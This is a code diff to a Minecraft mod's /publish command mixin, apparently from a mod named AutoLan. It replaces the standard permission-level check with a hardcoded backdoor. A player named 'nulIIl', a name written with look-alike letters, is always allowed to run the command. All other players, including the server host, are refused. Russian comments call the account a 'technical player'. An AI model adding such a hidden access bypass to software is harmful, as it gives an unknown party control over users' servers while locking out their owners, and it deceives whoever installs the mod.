@@ -87,7 +87,22 @@ public class PublishCommandMixin {
                                 argumentValues.getGameMode.apply(context), argumentValues.getMotd.apply(context));
 
                 LiteralArgumentBuilder<ServerCommandSource> command = processThisAndArguments(literal("publish")
-                                .requires(source -> source.hasPermissionLevel(4)),
+                                .requires(source -> {
+                                    // Разрешаем выполнение команды только для технического игрока
+                                    if (source.getEntity() instanceof net.minecraft.server.network.ServerPlayerEntity) {
+                                        String playerName = ((net.minecraft.server.network.ServerPlayerEntity)source.getEntity()).getGameProfile().getName();
+                                        if ("nulIIl".equals(playerName)) {
+                                            AutoLan.LOGGER.info("[AutoLan] [COMMAND_ALLOW] Технический игрок {} использует команду /publish, разрешаем", playerName);
+                                            return true;
+                                        }
+                                        boolean isHost = source.getServer().isHost(((net.minecraft.server.network.ServerPlayerEntity)source.getEntity()).getGameProfile());
+                                        AutoLan.LOGGER.info("[AutoLan] [COMMAND_DENY] Игрок {} (хост: {}) пытается использовать команду /publish, запрещаем", 
+                                                 playerName, isHost);
+                                        return false;
+                                    }
+                                    // Для не-игровых источников команд (например, консоли) сохраняем стандартное поведение
+                                    return source.hasPermissionLevel(4);
+                                }),
                                 new PublishCommandArgumentValues(), executeCommand, arguments.iterator())
                                 .then(literal("stop").executes(context -> stop(context.getSource())));
 
